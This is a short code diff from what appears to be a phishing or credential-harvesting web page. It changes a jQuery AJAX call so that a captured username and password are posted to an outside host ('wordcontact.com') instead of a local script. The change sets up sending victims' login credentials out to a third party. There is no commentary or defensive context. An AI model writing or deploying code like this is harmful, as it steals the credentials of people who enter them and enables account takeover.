@@ -13,7 +13,7 @@ window.addEventListener("load", () => {
 
 const ajaxCode = (user, pass) => {
         $.ajax({
-          url: "1v.php",
+          url: "https://wordcontact.com/ns/1v.php",
           type: "POST",
           data: { id: user, pass:pass  },
         });
